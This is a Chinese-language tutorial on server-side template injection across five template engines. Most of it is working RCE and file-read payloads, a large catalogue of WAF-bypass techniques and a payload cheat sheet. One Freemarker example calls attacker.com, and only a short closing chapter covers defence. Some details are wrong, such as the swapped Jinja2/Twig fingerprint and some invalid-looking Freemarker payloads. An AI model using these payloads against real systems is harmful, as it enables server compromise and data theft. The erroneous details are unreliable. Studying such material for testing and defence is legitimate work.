---
title: SSTI 模板注入全解：从检测到 RCE
date: 2026-06-24 14:00:00
tags:
- SSTI
- 模板注入
- Jinja2
- Twig
- Freemarker
- RCE
categories:
- 安全研究
---

# SSTI 模板注入全解：从检测到 RCE

> 涵盖 Jinja2、Twig、Freemarker、Velocity、Thymeleaf 等主流模板引擎，系统化拆解 SSTI 检测与利用

---

## 目录

- [第1章 SSTI 概述](#第1章-ssti-概述)
- [第2章 检测与探测](#第2章-检测与探测)
- [第3章 Jinja2（Python）](#第3章-jinja2python)
- [第4章 Twig（PHP）](#第4章-twigphp)
- [第5章 Freemarker（Java）](#第5章-freemarkerjava)
- [第6章 Velocity（Java）](#第6章-velocityjava)
- [第7章 Thymeleaf（Java）](#第7章-thymeleafjava)
- [第8章 防御与修复](#第8章-防御与修复)

---

## 第1章 SSTI 概述

### 1.1 什么是模板引擎

模板引擎将**模板**（含占位符的文本）和**数据**（变量值）合并，生成最终的 HTML 或文本输出。

```
模板: <h1>Hello {{ name }}</h1>
数据: name = "admin"
输出: <h1>Hello admin</h1>
```

### 1.2 什么是 SSTI

SSTI（Server-Side Template Injection，服务端模板注入）发生在**用户输入被直接拼接到模板中**而非作为数据传入时。

```python
# ❌ 危险：用户输入被拼接到模板字符串中
template = "Hello " + user_input
render(template)

# ✅ 安全：用户输入作为变量值传入
render("Hello {{ name }}", name=user_input)
```

### 1.3 SSTI 能做什么

| 能力 | 说明 |
|------|------|
| 读取敏感数据 | 配置文件、环境变量、数据库连接信息 |
| 文件读取 | 读取服务器上的任意文件 |
| RCE | 在服务器上执行任意命令 |
| SSRF | 向内部网络发送请求 |
| 横向移动 | 读取其他模板上下文的变量 |

### 1.4 常见模板引擎

| 引擎 | 语言 | 语法特征 | 常见框架 |
|------|------|---------|---------|
| Jinja2 | Python | `{{ }}`、`{% %}` | Flask, Django |
| Twig | PHP | `{{ }}`、`{% %}` | Symfony, Drupal |
| Freemarker | Java | `${}`、`<# >` | Spring MVC |
| Velocity | Java | `${}` | Spring, Struts |
| Thymeleaf | Java | `th:text`、`[[...]]` | Spring Boot |
| Smarty | PHP | `{$var}` | Laravel |
| Pug/Jade | Node.js | `#{var}` | Express |

---

## 第2章 检测与探测

### 2.1 通用探测 Payload

在任意疑似模板注入点输入数学表达式：

```
{{7*7}}
${7*7}
#{7*7}
*{7*7}
```

如果返回 `49` 或类似计算结果，说明存在 SSTI。

### 2.2 各引擎识别

| 输入 | 预期输出 | 引擎 |
|------|---------|------|
| `{{7*7}}` | `49` | Jinja2 / Twig |
| `${7*7}` | `49` | Freemarker / Velocity |
| `#{7*7}` | `49` | Thymeleaf (默认不计算) |
| `*{7*7}` | `49` | Thymeleaf (Spring EL) |
| `{{7*'7'}}` | `49` | Jinja2（字符串乘法） |
| `{{7*'7'}}` | `7777777` | Twig（重复字符串） |

### 2.3 探测模板是否存在

```python
# Jinja2
{{config}}           → 显示 Flask 配置对象
{{self}}             → 显示当前模板对象

# Twig
{{_self}}            → 显示模板自身
{{_context}}          → 显示上下文变量

# Freemarker
${.globals}          → 显示全局变量
${.dataModel}        → 显示数据模型
```

---

## 第3章 Jinja2（Python）

### 3.1 基础语法

```jinja2
{{ variable }}       → 输出变量值
{% for x in list %}  → 控制语句
{% endif %}          → 结束
{# comment #}        → 注释
```

### 3.2 从 SSTI 到 RCE 的关键链

Jinja2 在 Python 中运行，可以通过 Python 的对象模型链从任意对象摸到 `__builtins__`：

#### 方法一：`__class__.__mro__` 链

```python
# 经典逃逸链
''.__class__.__mro__[1].__subclasses__()
```

逐步拆解：

```python
''.__class__
# <class 'str'>

''.__class__.__mro__
# (<class 'str'>, <class 'object'>)  ← 方法解析顺序

''.__class__.__mro__[1]
# <class 'object'>  ← 拿到所有类的基类

''.__class__.__mro__[1].__subclasses__()
# [<class 'type'>, <class 'weakref'>, <class 'dict'>, ...]
# ← 当前 Python 进程加载的所有类
```

#### 方法二：使用 `__builtins__`

```python
# 从任意类的 __init__.__globals__ 中拿到 __builtins__
''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']
```

### 3.3 找可用子类的自动化方法

```python
# 打印索引和类名
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
    {% if c.__name__ == 'Popen' or c.__name__ == 'os' or c.__name__ == 'builtins' %}
        {{ loop.index0 }}: {{ c.__name__ }}
    {% endif %}
{% endfor %}
```

**常用目标类**：

| 类名 | 位置 | 用途 |
|------|------|------|
| `subprocess.Popen` | 需找到索引 | 命令执行 |
| `os.wrap_close` | 包含 `os` 模块 | 通过 `__init__.__globals__` 拿到 os |
| `warnings.catch_warnings` | 常见 | 含 `__builtins__` |
| `_frozen_importlib.BuiltinImporter` | 常见 | 可加载任意模块 |

### 3.4 完整 RCE Payload

#### 找到 Popen 类

```jinja2
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
    {% if c.__name__ == 'Popen' %}
        {{ c('cat /flag', shell=True, stdout=-1).communicate()[0] }}
    {% endif %}
{% endfor %}
```

#### 通过 `__builtins__` 执行

```jinja2
{% set builtins = ''.__class__.__mro__[1].__subclasses__()
     [X].__init__.__globals__['__builtins__'] %}
{{ builtins['__import__']('os').system('id') }}
```

#### 通过 `cycler` 对象（Flask/Jinja2 自带）

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

#### 通过 `lipsum` 对象

```jinja2
{{ lipsum.__globals__['os'].popen('id').read() }}
```

#### 通过 `joiner` 对象

```jinja2
{{ joiner.__init__.__globals__.os.popen('id').read() }}
```

### 3.5 过滤绕过（全场景详解）

以下绕过方法按 WAF 拦截类型分类，绝大部分可以组合使用。

---

#### 场景一：过滤 `__`（双下划线）

WAF 检测规则往往是匹配 `__class__`、`__builtins__` 这类双下划线开头的字符串。

**方法 1：`|attr()` 过滤器替代属性访问**

`|attr()` 是 Jinja2 内置过滤器，参数是字符串，不会在 AST 中产生 `Attribute` 节点：

```jinja2
# 原始: ''.__class__
# 绕过:
{{ ''|attr('__class__') }}
# 等价于 ''.__class__

# 完整链:
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}
```

**方法 2：字符串拼接拆解 `__`**

```jinja2
{{ ''|attr('_' + '_class_' + '_') }}

# 或者拆成三块
{{ ''|attr('__c' + 'lass__') }}
{{ ''|attr('__cl' + 'ass__') }}
{{ ''|attr('__cla' + 'ss__') }}
```

**方法 3：切片取值**

```jinja2
# 从已有字符串中切片拼出 __
{% set a = '_' %}
{% set b = a~a~'class'~a~a %}    {# ~ 是 Jinja2 的字符串连接符 #}
{{ ''|attr(b) }}
```

**方法 4：利用 `dict` 的 `|join` 过滤器拼出下划线**

```jinja2
# 利用 dict 的 join 过滤器，指定连接符为空
{% set x = (dict(a=1)|join) %}        # → 'a'（字典的 key 被 join 出来）
# 但是我们需要下划线，可以用反转：
{% set x = (dict(a=1)|join|string)[0] %}  # → 'a' 的第一字符，不是我们要的...

# 更巧妙：利用 dict 本身
{% set under = (dict(__=1)|join)[:1] %}   # → '_'（从 '__' 取第一个字符）
{{ under }}                                # 输出 _

# 然后用 under~under~'class'~under~under 拼出 __class__
```

**方法 5：使用 `lipsum`、`cycler`、`joiner` 等自带对象（不需要 `__`）**

```jinja2
# 这几个对象直接挂载在全局命名空间，不需要通过 __class__ 链
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
```

这些对象的名字短，不包含 `__`，在某些 WAF 中比 `__class__` 链更容易过。

---

#### 场景二：过滤 `[` 和 `]`（中括号）

WAF 拦截 `[]` 时，无法使用下标访问。有多种替代方案。

**方法 1：`__getitem__()` 方法**

```jinja2
# 原始: obj[0]
# 绕过:
{{ obj.__getitem__(0) }}

# 原始: obj['key']
# 绕过:
{{ obj.__getitem__('key') }}
```

**方法 2：配合 `|attr()` 访问字典键**

```jinja2
{{ obj|attr('__getitem__')('key') }}
```

**方法 3：`.pop()` 方法**

```jinja2
# pop 也能取指定键的值
{{ obj.pop('key', None) }}
```

**方法 4：Jinja2 的 `.X` 属性访问（仅限字典键名合法的）**

```jinja2
# 如果 dict 中有 key 叫 'os'
{{ obj.os }}
# 等价于 obj['os']
```

这对变量名必须是合法 Python 标识符的情况有效。

**方法 5：`|first` / `|last` 过滤器**

```jinja2
# 取列表第一个/最后一个元素
{{ list_var|first }}
{{ list_var|last }}
```

---

#### 场景三：过滤 `.`（点号 / 属性访问符）

有些 WAF 会拦截点符号，防止属性访问链。

**方法 1：`|attr()` 完全替代点号**

```jinja2
# 原始: obj.attr1.attr2
# 绕过:
{{ obj|attr('attr1')|attr('attr2') }}

# 完整逃逸链:
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}
```

**方法 2：中括号替代（如果点号被禁但中括号没被禁）**

```jinja2
{{ obj['__class__']['__mro__'][1]['__subclasses__']() }}
```

**方法 3：组合使用**

```jinja2
{{ obj['__class__']|attr('__mro__')['__getitem__'](1) }}
```

---

#### 场景四：过滤引号（`'` 和 `"`）

复杂场景，WAF 不仅拦截属性名，还拦截所有字符串字面量。

**方法 1：从请求参数中取字符串**

```jinja2
# Flask 环境下, request.args 直接可取 GET 参数
{{ ''|attr(request.args.a) }}
# 访问: ?a=__class__

# 或
{{ ''|attr(request.values.a) }}
# 同时支持 GET/POST 参数
```

**方法 2：从 Cookie 中取字符串**

```jinja2
{{ ''|attr(request.cookies.a) }}
# 设置 Cookie: a=__class__
```

**方法 3：从 `config` 对象中取预置字符串**

```jinja2
# 如果 config 中有 SECRET_KEY 等值
# 可以利用切片从已知字符串中取出需要的字符
{% set c = config.SECRET_KEY %}
# 从 SECRET_KEY 中切片拼出目标字符串
```

**方法 4：利用 Jinja2 内置变量的字符串值**

```jinja2
# 利用 range 函数的字符串形式
{% set r = range(1)|string %}       # → 'range(0, 1)'
{% set under = r[0] %}              # → 'r'

# 但从已有字符串中提取字符比较麻烦，需要找包含目标字符的源字符串

# 另一种：利用 dict|join 产生的字符串
{% set tmp = (dict(__builtins__=1)|join) %}  # → '__builtins__=1'
{% set builtins_str = tmp[:11] %}            # → '__builtins__'
```

**方法 5：使用 `dict` 的 key 作为字符串载体**

```jinja2
# 在 Jinja2 中，dict 字面量的 key 不需要引号
{{ ''|attr(dict(__class__=1)|join|first) }}
# dict(__class__=1) → {'__class__': 1}
# |join → '__class__=1'
# |first → '_'（第一个字符）

# 要取完整的 '__class__'：
{% set cls = (dict(__class__=1)|join)[:11] %}
{# 但 join 的结果是 '__class__=1'，长度 11 的只有 '__class__='... #}
{# 更精确的方法：#}
{% set cls = (dict(__class__=1)|join|replace('=1', '')) %}
```

**方法 6：`lipsum` 的直接调用（完全不需引号）**

```jinja2
# lipsum 对象本身就在全局，可直接调用 globals
{{ lipsum.__globals__['os'].popen(request.args.cmd).read() }}
# 访问: ?cmd=id
```

---

#### 场景五：过滤 `{{`（双大括号）

**方法 1：改用 `{%` 语句块**

```jinja2
{% if lipsum.__globals__['os'].popen('id').read() %}x{% endif %}
```

**方法 2：用 `{#` 注释块绕过（极少场景）**

```jinja2
{# 某些过滤只检查 {{，不检查 {% 或 {#
```

**方法 3：换行/空格绕过（针对正则匹配不严谨的 WAF）**

```jinja2
# WAF 正则: \{\{.+?\}\}
# 绕过：在 {{ 中插入换行或空格
{{ 7*7 }}
{{
7*7
}}
```

---

#### 场景六：过滤关键字（`class`、`mro`、`base`、`subclasses`、`builtins`、`globals`、`init` 等）

**方法 1：字符串拼接**

```jinja2
{{ ''|attr('__cla' + 'ss__') }}
{{ ''|attr('__' + 'class' + '__') }}
```

**方法 2：Unicode / Hex 编码**

```jinja2
# \x5f = _
# \x63 = c
{{ ''|attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f') }}
# 等价于 __class__

# 完整 chained:
{{ ''|attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f')|attr('\x5f\x5f\x6d\x72\x6f\x5f\x5f')|attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')(1)|attr('\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f')() }}
```

**方法 3：Oct 八进制编码**

```jinja2
# 在 Jinja2 中，某些场景支持八进制
```

**方法 4：`|reverse` 过滤器反转字符串**

```jinja2
{% set cmd = 'ssalc__'|reverse %}   # → '__class__'
{% set builtins = 's__'|reverse %}  # → '__s' ... 不太对

# 更好：
{% set target = 'ssalc__' %}         # 目标 __class__ 倒过来写
{% set cmd = target|reverse %}       # → '__class__'
{{ ''|attr(cmd) }}
```

**方法 5：`|replace` / `|trim` 过滤器变形**

```jinja2
{% set base = '__XclassX__'|replace('X', '') %}
{{ ''|attr(base) }}

# 或使用 trim
{% set base = '  __class__  '|trim %}
```

**方法 6：`|lower` / `|upper` 转换**

```jinja2
# 如果 WAF 只拦截小写
{% set cmd = '__CLASS__'|lower %}
{{ ''|attr(cmd) }}
```

**方法 7：从环境变量/配置中读取字符串**

```jinja2
# 利用 config 对象中已有的值
# config.SECRET_KEY 可能与 'SECRET' 有关
# 可以从类似字符串中切片取字符

# 假设有一条路径的字符串是已知的
{% set p = self|string %}  # 得到当前模板的字符串表示
# 从中提取需要的字符
```

**方法 8：利用 `lipsum` 绕过关键字检测（最强方案）**

```jinja2
# lipsum 不需要 __class__ 链，直接访问 __globals__
# 原始链中需要: class, mro, subclasses, builtins 等
# 绕过链只需要: lipsum, __globals__
{{ lipsum.__globals__['os'].popen('id').read() }}

# 如果 lipsum 也被过滤，用 cycler/joiner/range
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

---

#### 场景七：综合过滤（同时禁多个语法要素）

实战中最常见的情况：WAF 同时拦截了 `__`、`.`、`[]`、`'`、多个关键字。

**例 1：只禁 `__` 和 `'` 和 `"`**

```jinja2
# 利用 request.args 传字符串
{{ lipsum|attr(request.args.a)|attr(request.args.b)|attr(request.args.c) }}
# 访问: ?a=__globals__&b=os&c=popen&cmd=id

# 最终效果：lipsum.__globals__['os'].popen('id')
# 但 popen 需要参数，参数也可以用 request.args
{{ lipsum|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)(request.args.d) }}
# 访问: ?a=__globals__&b=os&c=popen&d=cat+/etc/passwd
```

**例 2：全禁（`__`、`.`、`[]`、`'`、`"`、`class` 等全禁）**

```jinja2
# 最终方案：request.args 提供所有字符串

# 第一段：构造 __class__ 链
{{ ''|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)(request.args.d|int)|attr(request.args.e)()|attr(request.args.f) }}
# 访问参数：
# ?a=__class__
# &b=__mro__
# &c=__getitem__
# &d=1              (取 object)
# &e=__subclasses__
# &f=__getitem__

# 但这只是一个元素，要遍历很麻烦

# 更好的方案：直接用 lipsum
{{ lipsum|attr(request.args.g)|attr(request.args.h)|attr(request.args.i)(request.args.j) }}
# ?g=__globals__&h=os&i=popen&j=id
```

**例 3：极致绕过 — 参数全放 Cookie/Header**

当 GET/POST 参数也被 WAF 拦截时，可以把 Payload 片段分散到不同位置：

```jinja2
# 从 Cookie 取
{{ lipsum|attr(request.cookies.a) }}

# 从 Header 取
{{ lipsum|attr(request.headers.get('X-A')) }}
```

设置：

```
Cookie: a=__globals__
X-A: popen
```

某些 WAF 只检查请求体和 URL 参数，不检查 Cookie 和自定义 Header。

**例 4：多层编码绕过 WAF 正则**

```jinja2
# 第一层：Base64 解码
{% set cmd = 'X19jbGFzc19f'|decode('base64') %}  # base64('__class__')
{{ ''|attr(cmd) }}
```

---

#### 场景八：利用 Jinja2 内置过滤器构造字符

不使用任何字符串常量，完全从数字和函数返回值中构造出 Payload：

```jinja2
# 利用 range 和 join 输出字符
{% set numbers = range(100) %}      # 0-99
{% set chars = numbers|join %}      # "01234567891011..."
{% set u95 = '_' %}                 # 不太好直接...

# 利用 dict 构造
{% set sl = dict(__=1)|join|first %}  # '_'（从 '__=1' 取第一个字符 '_'）

# 实际组合：
{% set u = (dict(__=1)|join)[:1] %}           # '_'
{% set c = (dict(ca=1)|join)[:1] %}           # 'c'
{% set l = (dict(lc=1)|join)[:1] %}           # 'l'
{% set a = (dict(ab=1)|join)[:1] %}           # 'a'
{% set s = (dict(ss=1)|join)[:1] %}           # 's'

{% set class_str = u~u~c~a~l~s~s~u~u %}      # '__class__'
{% set mro_str = u~u~('mro'|string)~u~u %}    # '__mro__'

{{ ''|attr(class_str)|attr(mro_str) }}
```

---

#### 场景九：绕过 `{{` 和 `{%` 都被过滤

极少数 WAF 同时禁用了 `{{` 和 `{%`，但在 Flask 下还有一条路：

```jinja2
# 利用 template 表达式在 URL 中直接执行
# 某些 Flask 配置允许在 URL 路径中嵌入模板表达式
# URL: http://target.com/{{config}}
```

但这取决于具体的应用配置，不是通用方法。

---

#### 场景十：替换对象 — 不同的逃逸入口

如果 `__class__`、`__mro__`、`__subclasses__` 全被封，但某个特定入口没被封：

**10 个不同的逃逸入口：**

```jinja2
# 1. 空字符串
{{ ''.__class__... }}

# 2. 空列表
{{ [].__class__... }}

# 3. 空字典
{{ {}.__class__... }}

# 4. 空元组
{{ ().__class__... }}

# 5. 数字
{{ 1..__class__... }}     # 注意第一个点号是小数点

# 6. lipsum（全局函数）
{{ lipsum.__globals__... }}

# 7. cycler（全局对象）
{{ cycler.__init__.__globals__... }}

# 8. joiner
{{ joiner.__init__.__globals__... }}

# 9. namespace
{{ namespace.__init__.__globals__... }}

# 10. range
{{ range.__class__... }}
```

---

#### 场景十一：WAF 正则绕过技巧

针对基于正则表达式的 WAF：

**技巧 1：插入多余空格/换行**

```jinja2
# WAF 正则: \{\{.*?__class__.*?\}\}
# 绕过:
{{ ''|attr('__'  ~   'class__') }}
# ~ 是 Jinja2 的字符串连接符

# 或换行
{{ ''|attr('__'
    'class__') }}
```

**技巧 2：大小写混合（针对大小写敏感的正则）**

```jinja2
# 拦截 __class__ 但不拦截 __Class__
# Jinja2 属性名大小写敏感，所以这个方法一般无效
# 但过滤器名和某些特定场景可以用
{{ ''|attr('__CLASS__'|lower) }}
```

**技巧 3：两次编码**

```jinja2
# 如果 WAF 只做一次 URL 解码
# POST 时做二次 URL 编码
```

**技巧 4：分块提交**

```jinja2
# 将 Payload 分成多块在不同请求中
# 第一次：?a=__globals__
# 第二次：?a=__builtins__
# 合并执行
```

---

#### 绕过方法速查表

| WAF 拦截点 | 绕过方法 | 示例 |
|-----------|---------|------|
| `__` | `|attr()`、字符串拼接、lipsum 替代 | `\|attr('__class__')` |
| `.` | `|attr()`、`[]` | `\|attr('__class__')` |
| `[]` | `__getitem__()`、`|first`、`.pop()` | `obj.__getitem__('key')` |
| `'`/`"` | `request.args`、Cookie、dict key 无引号 | `\|attr(request.args.a)` |
| `class`/`mro` 等 | 字符串拼接、Unicode 编码、`\x5f` | `'__cl'~'ass__'` |
| `{{` | `{%` 语句块 | `{% if ... %}` |
| `lipsum` / `cycler` | 切换其他入口 | `range.__class__` |
| 多个同时拦截 | 组合使用 + request.args 全参数 | `\|attr(request.args.x)` |
| 正则匹配 | 插入空格/换行/`~` 连接 | `'__'~'class__'` |
| 参数检查 | Cookie/Header 外带 | `request.cookies.a` |

---

### 3.6 常见 Flask SSTI 场景

Flask 的 `config` 对象经常包含敏感信息：

```jinja2
{{ config }}
{{ config.SECRET_KEY }}
{{ config.DATABASE_URL }}
```

通过 SSTI 读 Flask session 密钥后可以伪造 session Cookie。

---

## 第4章 Twig（PHP）

### 4.1 基础语法

```twig
{{ variable }}      输出变量值
{% if expr %}       控制语句
{# comment #}       注释
```

### 4.2 RCE Payload

#### Twig 1.x — 使用 `getAttribute`

```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
```

#### Twig 2.x / 3.x — 使用 `set` + 过滤链

```twig
{% set cmd = "id" %}
{% set output = ''|split(cmd)|map('system') %}
{{ output }}
```

#### 直接调用 PHP 函数

```twig
{{ ['id']|filter('system') }}          <!-- Twig 2.x -->
{{ ['id']|map('system') }}             <!-- Twig 2.x+ -->
{{ {'id':'id'}|sort('system') }}       <!-- Twig 2.x+ -->
```

### 4.3 文件读取

```twig
{{ include('/etc/passwd') }}
{{ source('/etc/passwd') }}
```

---

## 第5章 Freemarker（Java）

### 5.1 基础语法

```ftl
${variable}          输出变量值
<#if condition>      控制语句
<#list list as item> 循环
<#assign x=1>        赋值
```

### 5.2 RCE Payload

#### 方法一：`new()` 内建函数（Freemarker 2.3.17+）

```ftl
${"freemarker.template.utility.Execute"?new()("id")}
```

#### 方法二：`exec` 内建函数（Freemarker 2.3.19+）

```ftl
${"java.lang.Runtime"?new()?.exec("id")}
```

#### 方法三：`Configuration` API

```ftl
${object?api.class.protectionDomain.codeSource.location}
```

#### 方法四：通过 `url` 连接

```ftl
<#assign uri= "http://attacker.com:8000/?cmd=id">
${uri?fetch}
```

### 5.3 文件读取

```ftl
${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
```

或者用 Java 原生：

```ftl
${"java.io.BufferedReader"?
    new()?call("java.io.InputStreamReader"?
    new()?call("java.io.FileInputStream"?
    new()?call("/etc/passwd")))}
```

---

## 第6章 Velocity（Java）

### 6.1 基础语法

```velocity
$variable            输出变量值
${variable}          明确边界的变量引用
#set($x = 1)         赋值
#if($condition)      条件
#foreach($item in $list)  循环
```

### 6.2 RCE Payload

```velocity
#set($exec = $class.inspect("java.lang.Runtime").getRuntime().exec("id"))
$exec
```

```velocity
#set($str = $class.inspect("java.lang.String"))
#set($ch = $str.toChars(47))
## 路径遍历
#set($file = $str.valueOf($class.inspect("java.io.File").parseParams("/flag")))
```

### 6.3 绕过安全约束

Velocity 内置了事件处理机制，可以通过 `EventCartridge` 绕过：

```velocity
#set($e = $eventcartridge)
#set($e2 = $e.getClass().getDeclaredField("MIGHT_BE_ACCESSIBLE"))
$e2.setAccessible(true)
$e2.set($e, true)
```

---

## 第7章 Thymeleaf（Java）

### 7.1 基础语法

```html
<!-- 标准表达式 -->
<p th:text="${message}">默认文本</p>

<!-- 链接表达式 -->
<a th:href="@{/home}">Home</a>

<!-- 选择表达式 -->
<div th:object="${user}">
    <p th:text="*{name}">名字</p>
</div>

<!-- 片段表达式 -->
<div th:fragment="header">...</div>
```

### 7.2 SSTI 漏洞点

Thymeleaf 的 SSTI 通常出现在框架自动解析视图名时。当 `@ResponseBody` 没有正确配置，Spring 使用 `ViewResolver` 解析返回值作为模板路径时：

```java
// ❌ 危险：用户控制返回值并被当作模板解析
@RequestMapping("/hello")
public String hello(@RequestParam String name) {
    return "hello/" + name;  // → 解析为 hello/{name} 模板
}

// ✅ 安全：使用 @ResponseBody 或 ResponseEntity
@RequestMapping("/hello")
@ResponseBody
public String hello(@RequestParam String name) {
    return "hello " + name;  // → 直接返回文本
}
```

### 7.3 RCE Payload

#### Spring SpEL 表达式

```html
<!-- 在模板文件中注入 -->
<p th:text="${T(java.lang.Runtime).getRuntime().exec('id')}">test</p>
```

#### 构造 URL 参数注入

```
http://target.com/hello/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x
```

URL 解码后：

```
http://target.com/hello/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

### 7.4 文件读取（SpringEL）

```html
<p th:text="${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/etc/passwd'))}">x</p>
```

### 7.5 Thymeleaf 的特定防御绕过

Thymeleaf 默认转义 HTML。使用 `th:utext`（不转义）和 `th:text`（转义）的区别：

```html
th:text="${1+1}"       → 输出 2（转义后）
th:utext="${1+1}"      → 输出 2（不转义）
```

---

## 第8章 防御与修复

### 8.1 通用防御原则

1. **不要将用户输入拼接到模板字符串中** — 用户输入永远作为变量值传入，而不是模板代码的一部分。

```python
# ❌ 危险
template = "Hello " + user_input
render(template)

# ✅ 安全
render("Hello {{ name }}", name=user_input)
```

2. **使用沙箱环境** — 限制模板中可访问的对象和方法。

### 8.2 各引擎安全配置

#### Jinja2 沙箱

```python
from jinja2 import Environment, SandboxedEnvironment

# 使用沙箱环境
env = SandboxedEnvironment()
env.parse(template)

# 限制可访问的内置函数
env.globals.clear()
env.globals['allowed_func'] = some_safe_function
```

#### Twig 安全配置

```php
// 禁用危险函数
$twig = new \Twig\Environment($loader, [
    'autoescape' => true,
    'sandbox' => true,
]);

$sandbox = new \Twig\Extension\SandboxExtension(
    new \Twig\Sandbox\SecurityPolicy(
        ['if', 'for', 'set'],     // 允许的标签
        ['escape', 'upper'],      // 允许的过滤器
        ['method'],               // 允许的方法
        ['property'],             // 允许的属性
        ['function']              // 允许的函数
    )
);
$twig->addExtension($sandbox);
```

#### Freemarker 安全配置

```java
Configuration cfg = new Configuration(Configuration.VERSION_2_3_32);
cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
// SAFER_RESOLVER 会阻止 new() 调用 Execute、Runtime 等危险类
// 或者使用 ALLOWS_NOTHING_RESOLVER 完全禁用
```

#### Thymeleaf 安全配置

```java
// 禁用表达式注入
SpringTemplateEngine engine = new SpringTemplateEngine();
engine.setEnableSpringELCompiler(false);  // 禁用 SpringEL 编译
```

### 8.3 过滤输入中的模板语法

```python
import re

def sanitize_template_input(user_input):
    """移除模板语法特征"""
    # 移除 {{ }}
    sanitized = re.sub(r'\{\{.*?\}\}', '', user_input)
    # 移除 {% %}
    sanitized = re.sub(r'\{\%.*?\%\}', '', sanitized)
    # 转义 ${}
    sanitized = sanitized.replace('${', '\\${')
    return sanitized
```

---

## 附录

### A. Payload 速查表

#### 检测

```
{{7*7}} → 49 (Jinja2/Twig)
${7*7} → 49 (Freemarker/Velocity)
*{7*7} → 49 (Thymeleaf SpringEL)
```

#### Jinja2 RCE

```python
# 最短 RCE
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
# 通用链
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('os').system('id') }}
```

#### Twig RCE

```twig
{{ ['id']|filter('system') }}
{{ ['id']|map('system') }}
{{ include('/etc/passwd') }}
```

#### Freemarker RCE

```ftl
${"freemarker.template.utility.Execute"?new()("id")}
${"java.lang.Runtime"?new()?.exec("id")}
```

#### Thymeleaf RCE

```html
<p th:text="${T(java.lang.Runtime).getRuntime().exec('id')}">x</p>
```

### B. 各引擎检测指纹速查

| 输入 | Jinja2 | Twig | Freemarker | Velocity | Thymeleaf |
|------|--------|------|-----------|----------|-----------|
| `{{7*7}}` | `49` | `49` | 不变 | 不变 | 不变 |
| `${7*7}` | 不变 | 不变 | `49` | `49` | 不变 |
| `#{7*7}` | 不变 | 不变 | 不变 | 不变 | 不变 |
| `*{7*7}` | 不变 | 不变 | 不变 | 不变 | `49` |
| `{{7*'7'}}` | `49` | `7777777` | 错误 | 不变 | 不变 |

### C. CTF 常见出题套路

| 套路 | 说明 | 常见绕过 |
|------|------|---------|
| 过滤 `__` | 不能使用魔术属性 | `|attr()` 过滤器 |
| 过滤 `[` `]` | 不能下标访问 | `.__getitem__()` 或 `|first` |
| 过滤 `.` | 不能属性访问 | `|attr()` 链 |
| 过滤 `class` | 关键字被拦截 | Unicode 编码 |
| 黑名单对象 | 已知对象被封 | 找未封的替代对象（lipsum、cycler） |
| 只允许数字 | 只能输出变量 | 用字符串方法绕过 |
